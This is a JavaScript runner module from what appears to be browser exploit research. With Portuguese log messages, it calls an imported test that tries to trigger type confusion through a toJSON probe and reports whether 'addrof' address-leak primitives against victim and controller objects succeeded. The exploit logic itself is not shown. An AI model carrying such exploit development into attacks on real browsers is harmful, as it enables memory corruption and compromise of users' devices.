// js/script3/runAllAdvancedTestsS3.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3 } from './s3_utils.mjs';
import { getOutputAdvancedS3, getRunBtnAdvancedS3 } from '../dom_elements.mjs';
import { 
    executeTypedArrayVictimAddrofTest_ExploitReturnedObject,   // NOME DA FUNÇÃO ATUALIZADO
    FNAME_MODULE_TYPEDARRAY_ADDROF_V19_ERO    // NOME DO MÓDULO ATUALIZADO
} from './testArrayBufferVictimCrash.mjs';

async function runHeisenbugReproStrategy_TypedArrayVictim() {
    const FNAME_RUNNER = "runHeisenbugReproStrategy_TypedArrayVictim_ExploitReturnedObject";
    logS3(`==== INICIANDO Estratégia de Reprodução do Heisenbug com TypedArray Vítima (ExploitReturnedObject) ====`, 'test', FNAME_RUNNER);

    const result = await executeTypedArrayVictimAddrofTest_ExploitReturnedObject(); 

    logS3(`   Total de chamadas da sonda toJSON durante o teste: ${result.total_probe_calls || 0}`, "info", FNAME_RUNNER); 
    
    if (result.errorOccurred) {
        logS3(`   RESULTADO: ERRO JS CAPTURADO: ${result.errorOccurred.name} - ${result.errorOccurred.message}.`, "error", FNAME_RUNNER);
        document.title = `Heisenbug (TypedArray-ERO) ERR: ${result.errorOccurred.name}`;
    } else {
        logS3(`   RESULTADO: Completou. Detalhes da sonda confusa (se ocorreu): ${result.toJSON_details ? JSON.stringify(result.toJSON_details) : 'N/A ou não confusa'}`, "good", FNAME_RUNNER);
        logS3(`   Stringify Output (first 200 chars): ${result.stringifyResult ? JSON.stringify(result.stringifyResult).substring(0, 200) + "..." : 'N/A'}`, "info", FNAME_RUNNER);
        
        let heisenbugConfirmedOnController = false;
        if (result.toJSON_details && result.toJSON_details.this_type === "[object Object]" && result.toJSON_details.controller_id_match) {
            heisenbugConfirmedOnController = true;
        }

        let anyAddrofSuccess = false;
        if (result.addrof_victim_A && result.addrof_victim_A.success) {
             logS3(`     ADDROF VÍTIMA A SUCESSO! ${result.addrof_victim_A.msg}`, "vuln", FNAME_RUNNER); anyAddrofSuccess = true;
        } else if (result.addrof_victim_A) {
             logS3(`     ADDROF VÍTIMA A FALHOU: ${result.addrof_victim_A.msg}`, "warn", FNAME_RUNNER);
        }
        if (result.addrof_victim_B && result.addrof_victim_B.success) {
             logS3(`     ADDROF VÍTIMA B SUCESSO! ${result.addrof_victim_B.msg}`, "vuln", FNAME_RUNNER); anyAddrofSuccess = true;
        } else if (result.addrof_victim_B) {
             logS3(`     ADDROF VÍTIMA B FALHOU: ${result.addrof_victim_B.msg}`, "warn", FNAME_RUNNER);
        }
        if (result.addrof_controller_A && result.addrof_controller_A.success) {
             logS3(`     ADDROF CONTROLLER A SUCESSO! ${result.addrof_controller_A.msg}`, "vuln", FNAME_RUNNER); anyAddrofSuccess = true;
        } else if (result.addrof_controller_A) {
             logS3(`     ADDROF CONTROLLER A FALHOU: ${result.addrof_controller_A.msg}`, "warn", FNAME_RUNNER);
        }
        if (result.addrof_controller_B && result.addrof_controller_B.success) {
             logS3(`     ADDROF CONTROLLER B SUCESSO! ${result.addrof_controller_B.msg}`, "vuln", FNAME_RUNNER); anyAddrofSuccess = true;
        } else if (result.addrof_controller_B) {
             logS3(`     ADDROF CONTROLLER B FALHOU: ${result.addrof_controller_B.msg}`, "warn", FNAME_RUNNER);
        }


        if (result.toJSON_details && result.toJSON_details.error) { // Checa o campo error do last_confused_probe_details_v19
            logS3(`     ERRO INTERNO NA SONDA (durante confusão): ${result.toJSON_details.error}`, "warn", FNAME_RUNNER);
            document.title = `Heisenbug (TypedArray-ERO) toJSON_ERR`;
        } else if (heisenbugConfirmedOnController) {
            logS3(`     !!!! TYPE CONFUSION NO controller_object OBSERVADA !!!!`, "critical", FNAME_RUNNER);
            if (result.toJSON_details.writes_to_victim_attempted) { 
                logS3(`       Escritas na VÍTIMA ORIGINAL (via controller_object.victim_ref) tentadas.`, "info");
            }
            if (result.toJSON_details.writes_to_controller_attempted) { 
                 logS3(`       Escritas no controller_object (this.marker_A/B) tentadas.`, "info");
            }
            if (!anyAddrofSuccess) {
                 document.title = `Heisenbug (TypedArray-ERO) Controller TC, Addr Fail`;
            } else {
                 document.title = `Heisenbug (TypedArray-ERO) Addr SUCCESS!`;
            }
        } else if (document.title.startsWith("Iniciando") || document.title.includes(FNAME_MODULE_TYPEDARRAY_ADDROF_V19_ERO) || document.title.includes("Probing")) {
            if (!anyAddrofSuccess) {
                 document.title = `Heisenbug (TypedArray-ERO) Test OK`;
            }
        }
    }
    logS3(`   Título da página: ${document.title}`, "info");
    await PAUSE_S3(MEDIUM_PAUSE_S3);

    logS3(`==== Estratégia de Reprodução do Heisenbug (ExploitReturnedObject) CONCLUÍDA ====`, 'test', FNAME_RUNNER);
}

export async function runAllAdvancedTestsS3() {
    const FNAME_ORCHESTRATOR = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V19_ERO}_MainOrchestrator`; 
    const runBtn = getRunBtnAdvancedS3();
    const outputDiv = getOutputAdvancedS3();

    if (runBtn) runBtn.disabled = true;
    if (outputDiv) outputDiv.innerHTML = '';

    logS3(`==== User Agent: ${navigator.userAgent} ====`,'info', FNAME_ORCHESTRATOR);
    logS3(`==== INICIANDO Script 3 (${FNAME_ORCHESTRATOR}): Reproduzindo Heisenbug com TypedArray Vítima (ExploitReturnedObject) ====`, 'test', FNAME_ORCHESTRATOR);

    await runHeisenbugReproStrategy_TypedArrayVictim();

    logS3(`\n==== Script 3 (${FNAME_ORCHESTRATOR}) CONCLUÍDO ====`, 'test', FNAME_ORCHESTRATOR);
    if (runBtn) runBtn.disabled = false;

    if (document.title.startsWith("Iniciando") || document.title.includes(FNAME_MODULE_TYPEDARRAY_ADDROF_V19_ERO)) {
        if (!document.title.includes("CRASH") && !document.title.includes("RangeError") && 
            !document.title.includes("SUCESSO") && !document.title.includes("Addr Fail") && 
            !document.title.includes("ERR") && !document.title.includes("Controller TC")) { 
            document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V19_ERO} Concluído`;
        }
    }
}
